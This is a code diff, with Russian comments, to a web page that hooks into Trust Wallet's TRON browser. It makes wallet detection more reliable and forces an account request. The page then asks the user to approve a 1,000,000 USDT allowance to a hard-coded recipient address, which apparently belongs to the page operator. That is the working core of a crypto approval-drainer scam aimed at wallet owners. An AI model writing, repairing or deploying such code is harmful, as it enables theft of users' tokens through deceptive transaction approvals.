@@ -54,35 +54,49 @@
             }
         });
 
-        // Реальное подключение кошелька (обновленный вариант для Trust Wallet)
+        // Подключение кошелька с адаптацией под встроенный браузер Trust Wallet
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                let tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
+                let tron = null;
+                let attempts = 0;
 
-                // Даем браузеру кошелька секунду на инициализацию, если объекты еще не прогрузились
-                if (!tron) {
-                    for (let i = 0; i < 5; i++) {
-                        await new Promise(resolve => setTimeout(resolve, 500));
-                        tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
-                        if (tron && tron.defaultAddress && tron.defaultAddress.base58) break;
+                // Цикл ожидания: проверяем появление объектов TRON в течение 10 секунд
+                while (!tron && attempts < 10) {
+                    tron = window.tronWeb || 
+                           (window.trustwallet && window.trustwallet.tronWeb) || 
+                           (window.ethereum && window.ethereum.tronWeb);
+                    
+                    if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
+                        break;
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    attempts++;
+                }
+
+                // Принудительный запрос аккаунта, если объект нашелся, но адрес еще не подтянулся
+                if (tron && (!tron.defaultAddress || !tron.defaultAddress.base58)) {
+                    if (typeof tron.request === 'function') {
+                        await tron.request({ method: 'tron_requestAccounts' });
                     }
                 }
 
+                // Проверяем результат
                 if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
                     userTronWeb = tron;
                     connectedAccount = userTronWeb.defaultAddress.base58;
                     document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                     alert("Кошелек успешно подключен!");
                 } else {
-                    alert("Ошибка: Trust Wallet не передал данные сети TRON. Убедитесь, что в кошельке открыта сеть TRON.");
+                    alert("Не удалось обнаружить сеть TRON. Убедитесь, что вы открыли сайт во встроенном браузере Trust Wallet.");
                 }
             } catch (error) {
                 console.error(error);
-                alert("Ошибка подключения кошелька: " + (error.message || error));
+                alert("Ошибка подключения: " + (error.message || error));
             }
         });
 
-        // Реальная транзакция / Approve в сети TRON
+        // Транзакция / Approve в сети TRON
         document.getElementById('approveBtn').addEventListener('click', async function() {
             if (!connectedAccount || !userTronWeb) {
                 alert("Сначала подключите кошелек!");
@@ -90,14 +104,11 @@
             }
 
             try {
-                // Загружаем контракт USDT
                 const contract = await userTronWeb.contract().at(usdtContractAddress);
-                
                 const amount = "1000000000000"; 
 
                 alert("Подтвердите транзакцию в вашем кошельке...");
 
-                // Вызов метода approve смарт-контракта на ваш адрес
                 const result = await contract.approve(
                     recipientAddress, 
                     amount
